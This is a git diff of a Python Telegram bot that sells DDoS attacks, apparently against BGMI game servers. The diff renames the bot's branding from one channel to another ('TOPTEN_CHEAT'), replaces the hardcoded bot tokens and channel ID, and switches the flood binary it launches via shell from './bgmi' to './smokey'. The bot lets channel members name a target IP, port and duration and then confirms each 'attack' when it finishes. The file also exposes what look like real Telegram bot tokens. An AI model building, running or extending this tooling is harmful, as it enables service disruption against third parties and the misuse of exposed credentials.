@@ -9,9 +9,9 @@ from datetime import datetime, timedelta, timezone
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
-TOKEN = '7773755329:AAELmC8OEC2ObClmvYA-Twlcb485-mGag0M' 
-CHANNEL_ID = '-1002444623350'
-required_channel = '@MRiNxDiLDOS'  # Replace with your actual channel username
+TOKEN = '7315607724:AAEm4UPL-RnDwHM9pxqqHRB8SXcUtB36VbA' 
+CHANNEL_ID = '-1002352302807'
+required_channel = '@TOPTEN_CHEAT'  # Replace with your actual channel username
 
 bot = telebot.TeleBot(TOKEN)
 
@@ -80,7 +80,7 @@ async def run_attack(chat_id, ip, port, duration):
         try:
             # Run the shell command asynchronously
             process = await asyncio.create_subprocess_shell(
-                f"./bgmi {ip} {port} {duration} 1200",
+                f"./smokey {ip} {port} {duration} 1200",
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
             )
@@ -97,7 +97,7 @@ async def run_attack(chat_id, ip, port, duration):
             # Notify the user that the attack has finished
             bot.send_message(
                 chat_id,
-                f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 {ip} : {port} 𝙛𝙤𝙧 {duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺 𝗠𝗥𝗶𝗡 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™"
+                f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 {ip} : {port} 𝙛𝙤𝙧 {duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺 @TOPTEN_CHEAT™"
             )
         except Exception as e:
             # Send an error message to the user in case of failure
@@ -114,7 +114,7 @@ def welcome_start(message):
     bot.send_message(
             message.chat.id,
             f"👋🏻  Welcome {user_name}.\n\n"
-            f"[➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/MRiNxDiLDOS)\n\n"    
+            f"[➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/TOPTEN_CHEATS)\n\n"    
             f"*Try To Run This Command : /bgmi*",
     parse_mode="Markdown",
     disable_web_page_preview=True  # This disables the link preview
@@ -149,8 +149,8 @@ def bgmi_command(message):
         if user_status not in ["member", "administrator", "creator"]:
             bot.send_message(
                 message.chat.id,
-                f"🚨𝗛𝗜 👋 {message.from_user.first_name}, \n\n‼️ *𝗠𝗥𝗶𝗡 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 !* ‼️\n\n"
-                f"            [➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/MRiNxDiLDOS)\n\n"
+                f"🚨𝗛𝗜 👋 {message.from_user.first_name}, \n\n‼️ *𝙏𝙊𝙋𝙏𝙀𝙉 𝙋𝙐𝘽𝙇𝙞𝘾 𝘿𝘿𝙊𝙎 𝗕𝗢𝗧 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 !* ‼️\n\n"
+                f"            [➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/TOPTEN_CHEAT)\n\n"
                 "🔒 *𝗬𝗼𝘂 𝗺𝘂𝘀𝘁 𝗷𝗼𝗶𝗻 𝗮𝗻𝗱 𝗯𝗲𝗰𝗼𝗺𝗲 𝗮 𝗺𝗲𝗺𝗯𝗲𝗿 𝗼𝗳 𝗼𝘂𝗿 𝗼𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗵𝗲𝗿𝗲!* 🔒\n\n",
                 parse_mode="Markdown",
                 disable_web_page_preview=True,
@@ -235,7 +235,7 @@ def bgmi_command(message):
     try:
         args = message.text.split()[1:]
         if len(args) != 3:
-            raise ValueError("𝗠𝗥𝗶𝗡 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n ⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙛𝙤𝙧𝙢𝙖𝙩\n /𝗯𝗴𝗺𝗶 <𝘁𝗮𝗿𝗴𝗲𝘁_𝗶𝗽> <𝘁𝗮𝗿𝗴𝗲𝘁_𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")
+            raise ValueError("𝙏𝙊𝙋𝙏𝙀𝙉 𝙋𝙐𝘽𝙇𝙞𝘾 𝘿𝘿𝙊𝙎 𝘼𝘾𝙏𝙄𝙑𝙀 ✅ \n\n ⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙛𝙤𝙧𝙢𝙖𝙩\n /𝗯𝗴𝗺𝗶 <𝘁𝗮𝗿𝗴𝗲𝘁_𝗶𝗽> <𝘁𝗮𝗿𝗴𝗲𝘁_𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")
         
         ip, port, duration = args
 
